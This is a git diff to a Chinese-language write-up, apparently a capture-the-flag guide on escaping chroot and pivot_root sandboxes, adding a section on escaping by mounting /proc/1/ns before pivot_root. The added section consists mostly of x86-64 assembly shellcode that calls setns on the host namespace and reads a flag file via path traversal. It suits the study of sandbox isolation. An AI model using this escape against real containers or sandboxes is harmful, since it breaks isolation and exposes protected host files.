@@ -27,6 +27,7 @@ comments: true
   - [4.2 mount的目录在所有命名空间中共享](#42-mount的目录在所有命名空间中共享)
   - [4.3 没有隔离pid namespace](#43-没有隔离pid-namespace)
   - [4.4 利用pivot\_root之前打开的目录/文件描述符实现逃逸](#44-利用pivot_root之前打开的目录文件描述符实现逃逸)
+  - [4.5 利用pivot\_root之前挂载的目录实现逃逸](#45-利用pivot_root之前挂载的目录实现逃逸)
 - [附录：利用chroot之前打开的目录/文件描述符 —— 手法](#附录利用chroot之前打开的目录文件描述符--手法)
   - [附录A：程序本身在chroot之前已打开目录/文件描述符](#附录a程序本身在chroot之前已打开目录文件描述符)
   - [附录B：bash tricks](#附录bbash-tricks)
@@ -553,6 +554,44 @@ buffer:
 ## 4.4 利用pivot_root之前打开的目录/文件描述符实现逃逸<br>
 同2.1节<br>
 
+## 4.5 利用pivot_root之前挂载的目录实现逃逸<br>
+这个场景下，允许你在执行`pivot_root`前挂载一个目录，此时可以选择挂载`/proc/1/ns`目录到`data`中<br>
+随后可以使用`setns`系统调用更换进程的命名空间，完成逃逸<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+# 打开一个命名空间
+mov rax, 2 #open
+lea rdi, [rip+file_path]
+mov rsi, 0 # O_RDONLY
+mov rdx, 0  
+syscall
+
+# setns进入该命名空间
+mov rdi, rax
+mov rsi, 0 #表示不检查命名空间类型
+mov rax, 0x134 # setns
+syscall
+
+# 打开flag文件
+mov rax, 2
+lea rdi, [rip+flag_path]
+mov rsi, 0
+mov rdx, 0
+syscall
+
+mov rdi, 1
+mov rsi, rax
+mov rdx, 0  # offset
+mov r10, 128 # length
+mov rax, 40 # sendfile
+syscall
+file_path:
+.string "/data/mnt"
+flag_path:
+.string "../../../../../../flag"
+```
 
 # 附录：利用chroot之前打开的目录/文件描述符 —— 手法<br>
 ## 附录A：程序本身在chroot之前已打开目录/文件描述符<br>
